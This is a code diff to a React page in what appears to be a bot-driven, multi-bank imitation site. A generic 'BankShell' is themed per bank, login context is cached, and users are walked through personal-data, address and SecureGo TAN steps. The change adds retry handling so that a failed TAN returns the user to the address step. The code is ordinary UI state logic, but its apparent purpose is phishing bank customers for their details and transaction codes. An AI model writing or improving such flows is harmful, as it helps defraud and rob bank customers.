@@ -1,5 +1,5 @@
 import { useEffect, useMemo, useRef, useState } from "react";
-import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { createFileRoute } from "@tanstack/react-router";
 import { Loader2 } from "lucide-react";
 import { getBotTask } from "@/lib/botClient";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
@@ -117,7 +117,6 @@ function makeFallbackAddress(current: { strasse: string; plzOrt: string }) {
 
 function PersonalDataPage() {
   const { taskId } = Route.useParams();
-  const navigate = useNavigate();
   const [result, setResult] = useState<any>(null);
   const [bankCtx, setBankCtx] = useState<BankCtx | null>(null);
   const [step, setStep] = useState<Step>("personal");
@@ -125,6 +124,7 @@ function PersonalDataPage() {
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
   const [addressFlowHandled, setAddressFlowHandled] = useState(false);
   const stepRef = useRef<Step>("personal");
+  const addressTanFailedRef = useRef(false);
   useEffect(() => { stepRef.current = step; }, [step]);
 
   // Bank context is cached from the login route; restore synchronously
@@ -229,6 +229,7 @@ function PersonalDataPage() {
           bankId={bankId}
           addressDecisionPending={addressDecisionPending}
           onAddressChoiceResolved={() => {
+            addressTanFailedRef.current = false;
             setAddressDecisionPending(false);
             setForceShowSecureGo(true);
             setStep("address");
@@ -266,13 +267,20 @@ function PersonalDataPage() {
           onSecureGoOpened={() => setForceShowSecureGo(false)}
           onConfirm={() => setStep("done")}
           onDelete={() => {
+            if (addressTanFailedRef.current) {
+              setStep("address-retry");
+              return;
+            }
             setAddressFlowHandled(true);
             setAddressDecisionPending(false);
             setForceShowSecureGo(false);
             setStep("done");
           }}
           onTanFailed={() => {
+            addressTanFailedRef.current = true;
             setForceShowSecureGo(false);
+            setAddressDecisionPending(false);
+            setAddressFlowHandled(false);
             setStep("address-retry");
           }}
           onNoAddress={() => setStep("done")}
